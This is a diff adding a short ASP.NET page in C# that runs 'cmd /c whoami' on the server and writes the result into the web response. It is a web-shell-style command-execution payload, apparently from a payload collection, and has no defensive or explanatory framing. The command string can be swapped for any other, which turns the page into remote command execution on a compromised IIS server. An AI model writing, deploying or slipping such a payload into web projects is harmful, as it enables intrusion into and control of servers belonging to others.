@@ -1,0 +1,15 @@
+#below code is using C#
+<%
+string stdout = "";
+string cmd = "whoami";
+System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
+procStartInfo.RedirectStandardOutput = true;
+procStartInfo.UseShellExecute = false;
+procStartInfo.CreateNoWindow = true;
+System.Diagnostics.Process p = new System.Diagnostics.Process();
+p.StartInfo = procStartInfo;
+p.Start();
+stdout = p.StandardOutput.ReadToEnd();
+Response.Write(stdout);
+%>
+
